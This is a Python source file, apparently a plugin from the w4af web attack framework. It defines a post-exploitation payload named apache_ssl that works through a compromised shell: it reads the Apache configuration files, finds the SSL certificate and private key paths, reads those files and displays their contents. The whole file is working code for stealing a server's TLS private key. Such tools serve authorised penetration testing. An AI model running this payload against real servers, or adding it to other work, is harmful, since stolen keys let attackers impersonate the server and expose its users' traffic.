import re
from w4af.plugins.attack.payloads.base_payload import Payload
from w4af.core.ui.console.tables import table


class apache_ssl(Payload):
    """
    This payload shows Apache SSL Certificate & Key
    """
    def api_read(self):
        result = {}
        result['apache_ssl_certificate'] = {}
        result['apache_ssl_key'] = {}

        def parse_ssl_cert(apache_config):
            cert = re.search(r'(?<=SSLCertificateFile)(?! directive)\s+(.*)',
                             apache_config)
            if cert:
                return cert.group(1)
            else:
                return ''

        def parse_ssl_key(apache_config):
            key = re.search(r'(?<=SSLCertificateKeyFile)\s+(.*)', apache_config)
            if key:
                return key.group(1)
            else:
                return ''

        apache_files = self.exec_payload(
            'apache_config_files')['apache_config']
        for file in apache_files:
            content = self.shell.read(file)
            certificate_file = parse_ssl_cert(content)
            if certificate_file != '':
                cert_content = self.shell.read(certificate_file)
                if cert_content:
                    result['apache_ssl_certificate'][
                        certificate_file] = cert_content

            key_file = parse_ssl_key(content)
            if key_file != '':
                key_content = self.shell.read(key_file)
                if key_content:
                    result['apache_ssl_key'][
                        key_file] = key_content
                else:
                    result['apache_ssl_key'][key_file] = ''


        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result['apache_ssl_certificate'] and not api_result['apache_ssl_key']:
            return 'Apache SSL key and Certificate not found.'
        else:
            rows = []
            rows.append(['Description', 'Value'])
            rows.append([])
            for key_name in api_result:
                for desc, value in api_result[key_name].items():
                    rows.append([desc, value])
            result_table = table(rows)
            result_table.draw(80)
            return rows
